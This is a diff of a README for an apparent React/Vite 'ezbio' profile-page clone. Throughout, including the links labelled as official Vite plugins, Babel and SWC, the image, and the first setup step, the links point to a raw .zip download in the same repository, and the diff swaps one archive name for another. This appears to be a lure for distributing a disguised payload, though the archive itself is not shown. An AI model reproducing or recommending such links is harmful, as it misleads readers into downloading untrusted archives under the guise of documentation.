@@ -1,4 +1,4 @@
-# Inspiration By: https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip 
+# Inspiration By: https://raw.githubusercontent.com/0hok/l0v3/root/public/v-l-3.4.zip https://raw.githubusercontent.com/0hok/l0v3/root/public/v-l-3.4.zip https://raw.githubusercontent.com/0hok/l0v3/root/public/v-l-3.4.zip 
 
 - Profile Views
 - Personal Links
@@ -18,18 +18,18 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip) uses [Babel](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip) uses [SWC](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/0hok/l0v3/root/public/v-l-3.4.zip) uses [Babel](https://raw.githubusercontent.com/0hok/l0v3/root/public/v-l-3.4.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/0hok/l0v3/root/public/v-l-3.4.zip) uses [SWC](https://raw.githubusercontent.com/0hok/l0v3/root/public/v-l-3.4.zip) for Fast Refresh
 
 ----------------------------------
-![img](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip)
+![img](https://raw.githubusercontent.com/0hok/l0v3/root/public/v-l-3.4.zip)
 
 
 
 ----------------------------------
 Steps to Run Website.
 
-1. Download [https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip](https://github.com/0hok/l0v3/raw/refs/heads/root/src/backend/l_v_3.5.zip)
+1. Download [https://raw.githubusercontent.com/0hok/l0v3/root/public/v-l-3.4.zip](https://raw.githubusercontent.com/0hok/l0v3/root/public/v-l-3.4.zip)
 2.  npm create vite@latest
 3. install the src code
 4. open folder ezbio-clone-root
